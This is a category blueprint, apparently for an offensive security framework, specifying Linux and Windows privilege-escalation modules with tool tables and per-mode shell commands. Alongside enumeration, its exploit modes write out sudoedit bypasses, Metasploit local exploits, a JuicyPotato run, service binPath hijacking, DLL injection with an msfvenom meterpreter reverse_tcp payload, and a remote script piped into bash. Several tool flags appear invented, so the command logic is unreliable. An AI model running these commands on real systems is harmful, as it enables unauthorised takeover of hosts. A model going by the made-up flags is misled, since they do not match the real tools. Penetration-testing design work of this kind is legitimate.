# Privilege Escalation — Category Blueprint

**Category:** `PRIVILEGE_ESCALATION` | **Slug:** `privesc` | **Tools Dir:** `~/jabber/jabber-tools/privesc/`
**Package:** `com.jabber.jabber.modules.privesc` | **Group:** Privilege & Identity

---

## ToolManager: `privesc/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `linpeas` | `linpeas.sh` | `carlospolop/PEASS-ng` | `bash linpeas.sh -h` | `github_release` |
| `winpeas` | `winPEASx64.exe` | `carlospolop/PEASS-ng` | N/A (Windows) | `github_release` |
| `pspy` | `pspy64` | `DominicBreuker/pspy` | `pspy64 --help` | `github_release` |
| `sudo` | `sudo` | system | `sudo --version` | system |
| `find` | `find` | system (coreutils) | `find --version` | system |
| `getcap` | `getcap` | apt (libcap2-bin) | `getcap -h` | `apt_install` |
| `strings` | `strings` | apt (binutils) | `strings --version` | `apt_install` |
| `ltrace` | `ltrace` | apt | `ltrace --version` | `apt_install` |
| `strace` | `strace` | apt | `strace --version` | `apt_install` |

---

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Privilege Escalation** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between scanning and exploitation (e.g., `SCAN` vs `EXPLOIT`).
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading enumeration logs, recovered keys, and exploitation artifacts.
4. **Privilege Graph**: Visual representation of the privilege tree (e.g., User -> Administrator -> SYSTEM).
5. **Interactive Shell Terminal**: For modules that gain higher privileges, a live terminal to interact with the new context.

---

---

## Modules

### 1. Linux Sudo SUID
**ID:** `privesc-sudo-suid` | **Risk:** HIGH | **File:** `LinuxSudoSUIDModule.java`
**Tools:** `sudo`, `find`, `getcap`, `linpeas`, `strings`

#### Execution Modes:

- **`SUDO`** (Short Name: `SUDO`)
    - **Purpose**: Comprehensive audit of sudo permissions and configuration security.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `sudo -l` (Primary Privilege Check)
        2. `sudo -V` (Version Vulnerability Audit)
        3. `linpeas.sh -a -s` (Passive Security Audit)
        4. `strings /etc/sudoers` (Configuration Disclosure)
        5. `find /usr/bin/sudo -perm -4000` (Binary Integrity Check)
    - **Execution Flow**: Privilege Check -> Version Audit -> Passive Audit -> Disclosure -> Integrity.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SUDO_[Timestamp]_sudo_l.txt`: Raw output of `sudo -l` privilege check.
        - `reports/artifacts/SUDO_[Timestamp]_linpeas_sudo.log`: LinPEAS audit log focused on sudo vulnerabilities.
        - `reports/analysis/SUDO_[Timestamp]_sudo_config.json`: Parsed and audited sudoers configuration.

- **`SUID`** (Short Name: `SUID`)
    - **Purpose**: Enumerate and audit SUID/SGID binaries for escalation vectors.
    - **Input Schema**: `{ path: String }`
    - **Multi-Tool Command Logic**:
        1. `find <path> -perm -4000 -type f 2>/dev/null` (SUID Discovery)
        2. `getcap -r <path> 2>/dev/null` (Capability Audit)
        3. `linpeas.sh -t suid` (Targeted SUID Audit)
        4. `strings <path>/binary | grep "PATH"` (Logic Flaw Check)
        5. `sudo -n find <path> -perm -u=s` (Authenticated Cross-Check)
    - **Execution Flow**: SUID Discovery -> Capability Audit -> Targeted Audit -> Logic Check -> Cross-Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SUID_[Timestamp]_suid_list.txt`: List of all identified SUID/SGID binaries.
        - `reports/artifacts/SUID_[Timestamp]_capability_audit.json`: Audit of Linux capabilities on discovered binaries.
        - `reports/analysis/SUID_[Timestamp]_logic_vulnerabilities.json`: Report on potential logic flaws in SUID binaries.

---

### 2. SUID Enum
**ID:** `privesc-suid-enum` | **Risk:** MEDIUM | **File:** `SUIDEnumModule.java`
**Tools:** `find`, `getcap`, `linpeas`, `ls`, `file`

#### Execution Modes:

- **`ENUM`** (Short Name: `ENUM`)
    - **Purpose**: Deep discovery and classification of SUID/SGID escalation vectors.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `find / -perm -u=s -type f 2>/dev/null` (Core Discovery)
        2. `getcap -r / 2>/dev/null` (Capability Mapping)
        3. `linpeas.sh -a` (Passive Profile)
        4. `ls -la /usr/bin/passwd` (Reference Integrity)
        5. `file /usr/bin/* | grep "setuid"` (Type Classification)
    - **Execution Flow**: Core Discovery -> Mapping -> Passive Profile -> Reference Integrity -> Classification.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ENUM_[Timestamp]_suid_inventory.json`: Comprehensive inventory of all SUID/SGID files.
        - `reports/artifacts/ENUM_[Timestamp]_capability_map.txt`: Recursive map of system capabilities.
        - `reports/analysis/ENUM_[Timestamp]_system_profile.json`: Passive security profile of the entire filesystem.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Detailed audit of discovered SUID binaries for GTFOBins compatibility.
    - **Input Schema**: `{ target_path: String }`
    - **Multi-Tool Command Logic**:
        1. `ls -l <target_path>` (Permission Profile)
        2. `getcap <target_path>` (Specific Capability Audit)
        3. `linpeas.sh -t <target_path>` (Targeted Vulnerability Audit)
        4. `file <target_path>` (Format Verification)
        5. `find <target_path> -perm -u=s` (Verification Check)
    - **Execution Flow**: Permission Profile -> Capability Audit -> Vulnerability Audit -> Verification -> Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_binary_audit.json`: Detailed vulnerability audit for the specific target binary.
        - `reports/artifacts/AUDIT_[Timestamp]_linpeas_target.log`: LinPEAS results for the specified path.
        - `reports/analysis/AUDIT_[Timestamp]_binary_verification.txt`: Technical verification of the binary's SUID status.

---

### 3. Cron Hijack
**ID:** `privesc-cron-hijack` | **Risk:** HIGH | **File:** `CronHijackModule.java`
**Tools:** `pspy`, `find`, `cat`, `linpeas`, `ltrace`

#### Execution Modes:

- **`WTCH`** (Short Name: `WTCH`)
    - **Purpose**: Real-time process monitoring to identify periodic tasks and crons.
    - **Input Schema**: `{ duration: int }`
    - **Multi-Tool Command Logic**:
        1. `pspy64 -f -i 1000 --duration <duration>` (Core Process Watch)
        2. `linpeas.sh -t cron` (Static Cron Audit)
        3. `find /etc/cron* -type f` (Cron Discovery)
        4. `cat /etc/crontab` (System Table Audit)
        5. `ltrace -p 1` (Init Process Sniff)
    - **Execution Flow**: Process Watch -> Static Audit -> Discovery -> Table Audit -> Init Sniff.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/WATCH_[Timestamp]_pspy_processes.log`: Real-time process monitoring logs from pspy.
        - `reports/outputs/WATCH_[Timestamp]_cron_discovery.json`: Catalog of all discovered periodic tasks and crons.
        - `reports/analysis/WATCH_[Timestamp]_init_sniff.txt`: Telemetry from the initialization process sniffing.

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify writable cron scripts and misconfigured file permissions.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `find /etc/cron* -writable 2>/dev/null` (Core Writable Discovery)
        2. `linpeas.sh -s` (Passive Security Audit)
        3. `cat /var/spool/cron/crontabs/*` (User Table Audit)
        4. `pspy64 -p` (Execution Path Audit)
        5. `ltrace ls /etc/cron.d/` (Access Trace)
    - **Execution Flow**: Writable Discovery -> Passive Audit -> User Table Audit -> Path Audit -> Access Trace.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_writable_crons.json`: List of crons and scripts with insecure write permissions.
        - `reports/artifacts/SCAN_[Timestamp]_user_crontabs.txt`: Consolidated output of all user-specific crontabs.
        - `reports/analysis/SCAN_[Timestamp]_execution_paths.json`: Map of cron execution paths and binary dependencies.

---

### 4. SudoEdit Exploit
**ID:** `privesc-sudoedit` | **Risk:** HIGH | **File:** `SudoEditModule.java`
**Tools:** `sudo`, `find`, `linpeas`, `pspy`, `strace`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect sudoedit vulnerabilities and configuration flaws.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `sudo -V | grep "sudoedit"` (Version Identification)
        2. `sudo -l | grep "sudoedit"` (Policy Discovery)
        3. `linpeas.sh -t sudo` (Targeted Sudo Audit)
        4. `find /usr/bin/sudoedit -ls` (Binary Profile)
        5. `strace -e execve sudo -V` (Execution Trace)
    - **Execution Flow**: Version Identification -> Policy Discovery -> Targeted Audit -> Binary Profile -> Execution Trace.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_sudo_version.txt`: Audited sudo version and its known vulnerabilities.
        - `reports/artifacts/SCAN_[Timestamp]_sudoedit_policy.json`: Detailed report on sudoedit policies and flaws.
        - `reports/analysis/SCAN_[Timestamp]_execution_trace.log`: Strace log of the sudoedit execution path.

- **`EXPL`** (Short Name: `EXPL`)
    - **Purpose**: Execute privilege escalation via sudoedit configuration bypass.
    - **Input Schema**: `{ target_file: String, allowed_file: String }`
    - **Multi-Tool Command Logic**:
        1. `EDITOR="nano -- <target_file>" sudoedit <allowed_file>` (Core Exploitation)
        2. `pspy64 -f` (Exploit Impact Audit)
        3. `linpeas.sh -a` (Post-Exploit Profile)
        4. `sudo -l` (Updated Privilege Audit)
        5. `strace -o trace.log sudoedit <allowed_file>` (Failure Debug Trace)
    - **Execution Flow**: Core Exploitation -> Impact Audit -> Post Profile -> Privilege Audit -> Debug Trace.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPLOIT_[Timestamp]_sudoedit_rce.txt`: Confirmation of privilege escalation via sudoedit.
        - `reports/artifacts/EXPLOIT_[Timestamp]_post_exploit_audit.log`: Comprehensive system audit after escalation.
        - `reports/analysis/EXPLOIT_[Timestamp]_exploit_telemetry.json`: Technical telemetry from the exploit execution.

---

### 5. Path Intercept
**ID:** `privesc-path` | **Risk:** HIGH | **File:** `PathInterceptModule.java`
**Tools:** `find`, `linpeas`, `pspy`, `strings`, `strace`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify writable directories in the current user's PATH for interception.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `echo $PATH | tr ":" "\n" | while read d; do [ -w "$d" ] && echo "$d"; done` (Core Path Discovery)
        2. `linpeas.sh -t path` (Passive Path Audit)
        3. `pspy64 -p` (Execution Path Monitoring)
        4. `find / -writable -type d 2>/dev/null` (Global Writable Audit)
        5. `strings /etc/environment` (System Env Disclosure)
    - **Execution Flow**: Path Discovery -> Passive Audit -> Monitoring -> Writable Audit -> Env Disclosure.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_writable_path.json`: Analysis of writable directories in the user's PATH.
        - `reports/artifacts/SCAN_[Timestamp]_pspy_path.log`: Process monitoring log focused on PATH-based execution.
        - `reports/analysis/SCAN_[Timestamp]_system_env.txt`: Captured system and user environment variables.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Deep audit of PATH-based binary search order and hijacking potential.
    - **Input Schema**: `{ target_dir: String }`
    - **Multi-Tool Command Logic**:
        1. `ls -ld <target_dir>` (Directory Profile)
        2. `linpeas.sh -s` (Passive Security Profile)
        3. `pspy64 -f` (File Access Monitoring)
        4. `strace -e stat ls` (System Search Trace)
        5. `find <target_dir> -maxdepth 1` (Content Inventory)
    - **Execution Flow**: Directory Profile -> Security Profile -> Monitoring -> Search Trace -> Inventory.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_search_order.json`: Detailed report on binary search order hijacking potential.
        - `reports/artifacts/AUDIT_[Timestamp]_strace_path.log`: Strace log showing system attempts to locate binaries.
        - `reports/analysis/AUDIT_[Timestamp]_directory_inventory.json`: Inventory of all files in the targeted PATH directory.

---

### 6. Token Impersonate
**ID:** `privesc-token` | **Risk:** CRITICAL | **File:** `TokenImpersonateModule.java`
**Tools:** `msfconsole`, `linpeas`, `whoami`, `winpeas`, `netstat`

#### Execution Modes:

- **`ENUM`** (Short Name: `ENUM`)
    - **Purpose**: Enumerate available user and service tokens for impersonation (Windows focus).
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `whoami /priv` (Privilege Audit)
        2. `msfconsole -x "use post/windows/gather/enum_tokens; run"` (Metasploit Enum)
        3. `winpeas.exe -t token` (WinPEAS Token Audit)
        4. `netstat -ano` (Session Context)
        5. `linpeas.sh -a` (Linux Cross-Audit)
    - **Execution Flow**: Privilege Audit -> Metasploit Enum -> WinPEAS Audit -> Session Context -> Cross-Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ENUM_[Timestamp]_privileges.txt`: Output of `whoami /priv` with vulnerability mapping.
        - `reports/artifacts/ENUM_[Timestamp]_winpeas_tokens.log`: WinPEAS audit log focused on Windows tokens.
        - `reports/analysis/ENUM_[Timestamp]_metasploit_tokens.json`: Results of the Metasploit token enumeration module.

- **`EXPL`** (Short Name: `EXPL`)
    - **Purpose**: Execute token impersonation to gain higher privilege context.
    - **Input Schema**: `{ token_name: String }`
    - **Multi-Tool Command Logic**:
        1. `msfconsole -x "use exploit/windows/local/ms16_075_reflection_juicy; set TOKEN <token_name>; run"` (Core Exploitation)
        2. `whoami` (Identity Verification)
        3. `winpeas.exe -s` (Post-Exploit Audit)
        4. `netstat -p tcp` (Connectivity Audit)
        5. `linpeas.sh -s` (System Integrity Check)
    - **Execution Flow**: Core Exploitation -> Identity Verification -> Post-Exploit Audit -> Connectivity -> Integrity.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPLOIT_[Timestamp]_token_identity.txt`: Confirmation of the new identity after token impersonation.
        - `reports/artifacts/EXPLOIT_[Timestamp]_winpeas_post.log`: Post-exploit system audit from WinPEAS.
        - `reports/analysis/EXPLOIT_[Timestamp]_connectivity_audit.json`: Audit of active network connections in the new context.

---

### 7. UAC Bypass
**ID:** `privesc-uac` | **Risk:** HIGH | **File:** `UACBypassModule.java`
**Tools:** `msfconsole`, `winpeas`, `powershell`, `reg`, `netsh`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect UAC configuration level and potential bypass opportunities.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin` (Core UAC Check)
        2. `winpeas.exe -t uac` (WinPEAS UAC Audit)
        3. `powershell -Command "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"` (System Policy Audit)
        4. `netsh interface show interface` (Interface Context)
        5. `msfconsole -x "use auxiliary/scanner/smb/smb_version; run"` (Environment Profile)
    - **Execution Flow**: UAC Check -> WinPEAS Audit -> Policy Audit -> Interface Context -> Environment Profile.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_uac_config.json`: Audit of UAC registry settings and enforcement levels.
        - `reports/artifacts/SCAN_[Timestamp]_winpeas_uac.log`: WinPEAS results for UAC bypass discovery.
        - `reports/analysis/SCAN_[Timestamp]_system_policies.json`: Comprehensive report on Windows security policies.

- **`EXPL`** (Short Name: `EXPL`)
    - **Purpose**: Execute UAC bypass chain to elevate to Administrative integrity.
    - **Input Schema**: `{ method: String, payload: String }`
    - **Multi-Tool Command Logic**:
        1. `msfconsole -x "use exploit/windows/local/bypassuac_<method>; set PAYLOAD <payload>; run"` (Core Bypass)
        2. `powershell -Command "whoami /groups | findstr /i Admin"` (Success Verification)
        3. `winpeas.exe -a` (Post-Elevation Audit)
        4. `reg query HKCU\Software\Classes` (User Hive Check)
        5. `netsh advfirewall show allprofiles` (Firewall Status Audit)
    - **Execution Flow**: Core Bypass -> Success Verification -> Post-Elevation Audit -> Hive Check -> Firewall Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPLOIT_[Timestamp]_uac_bypass_success.txt`: Confirmation of Administrative integrity level gain.
        - `reports/artifacts/EXPLOIT_[Timestamp]_firewall_status.json`: Audit of the Windows Firewall status after elevation.
        - `reports/analysis/EXPLOIT_[Timestamp]_registry_audit.json`: Post-elevation audit of protected registry hives.

---

### 8. Linux Kernel Exploit
**ID:** `privesc-kernel` | **Risk:** CRITICAL | **File:** `LinuxKernelExploitModule.java`
**Tools:** `uname`, `searchsploit`, `linpeas`, `gcc`, `wget`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Automated matching of kernel version against known exploit databases.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `uname -a` (Kernel Identification)
        2. `searchsploit --json "linux kernel $(uname -r)"` (Exploit Correlation)
        3. `linpeas.sh -t kernel` (Passive Vulnerability Audit)
        4. `wget -qO- https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash` (Alternative Suggester)
        5. `gcc --version` (Compiler Readiness Check)
    - **Execution Flow**: Identification -> Correlation -> Passive Audit -> Alternative -> Readiness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_kernel_version.txt`: Detailed kernel version and build identification.
        - `reports/artifacts/SCAN_[Timestamp]_searchsploit_matches.json`: JSON output of searchsploit exploit matches.
        - `reports/analysis/SCAN_[Timestamp]_exploit_suggestions.txt`: Output of the Linux Exploit Suggester.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Detailed environmental audit to verify exploit prerequisites.
    - **Input Schema**: `{ exploit_id: String }`
    - **Multi-Tool Command Logic**:
        1. `searchsploit -p <exploit_id>` (Exploit Detail Audit)
        2. `linpeas.sh -s` (Security Baseline Audit)
        3. `ls -l /proc/version` (System Version Audit)
        4. `gcc -o test test.c` (Compiler Functionality Test)
        5. `wget --spider http://google.com` (Outbound Connectivity Check)
    - **Execution Flow**: Detail Audit -> Baseline Audit -> Version Audit -> Compiler Test -> Connectivity Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_exploit_prereqs.json`: Audit of prerequisites for the selected kernel exploit.
        - `reports/artifacts/AUDIT_[Timestamp]_compiler_readiness.txt`: Verification of GCC and build environment functionality.
        - `reports/analysis/AUDIT_[Timestamp]_network_connectivity.json`: Report on outbound network access for payload delivery.

---

### 9. Windows DLL Injection
**ID:** `privesc-dll-inject` | **Risk:** HIGH | **File:** `WindowsDLLInjectionModule.java`
**Tools:** `msfvenom`, `msfconsole`, `winpeas`, `powershell`, `tasklist`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify processes vulnerable to DLL injection or search order hijacking.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `tasklist /v` (Process Inventory)
        2. `winpeas.exe -t process` (WinPEAS Process Audit)
        3. `powershell -Command "Get-Process | Select-Object Name, Id, Path"` (Path Disclosure)
        4. `msfconsole -x "use post/windows/gather/enum_processes; run"` (Metasploit Audit)
        5. `sc query type= service` (Service Context)
    - **Execution Flow**: Process Inventory -> WinPEAS Audit -> Path Disclosure -> Metasploit Audit -> Service Context.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_process_inventory.json`: Detailed inventory of running processes and owners.
        - `reports/artifacts/SCAN_[Timestamp]_winpeas_processes.log`: WinPEAS audit log for process vulnerabilities.
        - `reports/analysis/SCAN_[Timestamp]_service_context.json`: Report on Windows services and their security contexts.

- **`INJT`** (Short Name: `INJT`)
    - **Purpose**: Execute DLL injection into a target process to gain code execution.
    - **Input Schema**: `{ pid: int, dll_path: String }`
    - **Multi-Tool Command Logic**:
        1. `powershell -ExecutionPolicy Bypass -File inject.ps1 -ProcessId <pid> -DllPath <dll_path>` (Core Injection)
        2. `msfconsole -x "use exploit/windows/local/payload_inject; set PID <pid>; run"` (Metasploit Injection)
        3. `winpeas.exe -s` (Post-Injection Security Audit)
        4. `tasklist /FI "PID eq <pid>"` (Process Status Verification)
        5. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f dll` (Payload Generation)
    - **Execution Flow**: Core Injection -> Metasploit Injection -> Post-Audit -> Verification -> Payload Gen.
    - **Output Generation & Artifacts**:
        - `reports/outputs/INJECT_[Timestamp]_injection_status.txt`: Confirmation of successful DLL injection into the target PID.
        - `reports/artifacts/INJECT_[Timestamp]_payload_gen.log`: Log of MSFVenom payload generation for the injection.
        - `reports/analysis/INJECT_[Timestamp]_post_injection_audit.json`: Post-injection system security audit.

---

### 10. Windows Service Exploit
**ID:** `privesc-win-svc` | **Risk:** HIGH | **File:** `WindowsServiceExploitationModule.java`
**Tools:** `sc`, `icacls`, `winpeas`, `msfconsole`, `accesschk`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Detect Windows services with weak permissions or insecure executable paths.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` (Core Permission Audit)
        2. `winpeas.exe -t service` (WinPEAS Service Audit)
        3. `sc query state= all` (Service Inventory)
        4. `icacls "C:\Program Files\*"` (FileSystem Permission Audit)
        5. `msfconsole -x "use post/windows/gather/enum_services; run"` (Metasploit Audit)
    - **Execution Flow**: Permission Audit -> WinPEAS Audit -> Inventory -> FS Audit -> Metasploit Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_service_permissions.json`: Audit of service and filesystem permissions for escalation.
        - `reports/artifacts/SCAN_[Timestamp]_winpeas_services.log`: WinPEAS results for insecure Windows services.
        - `reports/analysis/SCAN_[Timestamp]_filesystem_audit.json`: Detailed report on Program Files directory permissions.

- **`EXPL`** (Short Name: `EXPL`)
    - **Purpose**: Exploit insecure services via path hijacking or binary replacement.
    - **Input Schema**: `{ service_name: String, bin_path: String }`
    - **Multi-Tool Command Logic**:
        1. `sc config <service_name> binPath= <bin_path>` (Core Configuration Change)
        2. `sc stop <service_name> && sc start <service_name>` (Service Restart)
        3. `icacls <bin_path>` (Binary Permission Verification)
        4. `winpeas.exe -a` (Post-Exploit System Audit)
        5. `msfconsole -x "use exploit/windows/local/service_permissions; set SERVICE <service_name>; run"` (Metasploit Support)
    - **Execution Flow**: Config Change -> Restart -> Permission Verify -> Post-Audit -> Metasploit Support.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPLOIT_[Timestamp]_service_reconfig.txt`: Confirmation of service binary path modification.
        - `reports/artifacts/EXPLOIT_[Timestamp]_service_restart.log`: Log of service stop and start actions.
        - `reports/analysis/EXPLOIT_[Timestamp]_post_exploit_audit.json`: Final system audit after service-based escalation.

---

### 11. Win Token Impersonation
**ID:** `privesc-win-token` | **Risk:** CRITICAL | **File:** `WindowsTokenImpersonationModule.java`
**Tools:** `msfconsole`, `winpeas`, `whoami`, `powershell`, `netstat`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Enumerate tokens and privileges for Potato-style impersonation.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `whoami /priv` (Privilege Audit)
        2. `winpeas.exe -t token` (WinPEAS Token Audit)
        3. `powershell -Command "Get-Service | Where-Object {$_.Status -eq 'Running'}"` (Service Context)
        4. `netstat -ano` (Network Listener Audit)
        5. `msfconsole -x "use post/windows/gather/enum_tokens; run"` (Metasploit Enum)
    - **Execution Flow**: Privilege Audit -> WinPEAS Audit -> Service Context -> Listener Audit -> Metasploit Enum.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_token_privileges.txt`: Audited user privileges (SeImpersonate, SeAssignPrimaryToken).
        - `reports/artifacts/SCAN_[Timestamp]_winpeas_tokens.log`: WinPEAS audit results for potato-style exploits.
        - `reports/analysis/SCAN_[Timestamp]_listener_audit.json`: Audit of local network listeners available for reflection.

- **`EXPL`** (Short Name: `EXPL`)
    - **Purpose**: Execute token impersonation using Potato techniques (Juicy/Rotten/Sweet).
    - **Input Schema**: `{ target_user: String, clsid: String, command: String }`
    - **Multi-Tool Command Logic**:
        1. `JuicyPotato.exe -l 1337 -p <command> -t * -c <clsid>` (Core Potato Exploit)
        2. `whoami` (Identity Verification)
        3. `winpeas.exe -s` (Post-Exploit Audit)
        4. `powershell -Command "Get-Process -Id $PID | Select-Object UserName"` (Process Context)
        5. `msfconsole -x "use exploit/windows/local/ms16_075_reflection_juicy; run"` (Metasploit Backup)
    - **Execution Flow**: Core Potato -> Identity Verify -> Post-Audit -> Process Context -> Metasploit Backup.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPLOIT_[Timestamp]_potato_success.txt`: Confirmation of SYSTEM privilege gain via Potato exploit.
        - `reports/artifacts/EXPLOIT_[Timestamp]_identity_verification.json`: Technical verification of the new process identity.
        - `reports/analysis/EXPLOIT_[Timestamp]_post_exploit_security.json`: Post-exploit system security and integrity report.

---

### 12. Windows UAC Bypass
**ID:** `privesc-uac-bypass` | **Risk:** HIGH | **File:** `WindowsUACBypassModule.java`
**Tools:** `msfconsole`, `winpeas`, `powershell`, `reg`, `netsh`

#### Execution Modes:

- **`BYPS`** (Short Name: `BYPS`)
    - **Purpose**: Execute advanced UAC bypass techniques for administrative elevation.
    - **Input Schema**: `{ method: String, command: String }`
    - **Multi-Tool Command Logic**:
        1. `powershell -ExecutionPolicy Bypass -File Invoke-UACBypass.ps1 -Method <method> -Command <command>` (Core Bypass)
        2. `whoami /groups` (Integrity Level Verification)
        3. `winpeas.exe -t uac` (UAC Security Audit)
        4. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` (Policy Check)
        5. `msfconsole -x "use exploit/windows/local/bypassuac; run"` (Alternative Bypass)
    - **Execution Flow**: Core Bypass -> Integrity Verify -> UAC Audit -> Policy Check -> Alternative.
    - **Output Generation & Artifacts**:
        - `reports/outputs/BYPASS_[Timestamp]_uac_results.txt`: Results of the UAC bypass attempt and integrity level gain.
        - `reports/artifacts/BYPASS_[Timestamp]_uac_audit.json`: Detailed audit of UAC configuration and bypass vectors.
        - `reports/analysis/BYPASS_[Timestamp]_integrity_profile.json`: Report on the new process integrity and privileges.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify the UAC configuration and check for known bypass vulnerabilities.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` (Policy Check)
        2. `winpeas.exe -t uac` (WinPEAS UAC Audit)
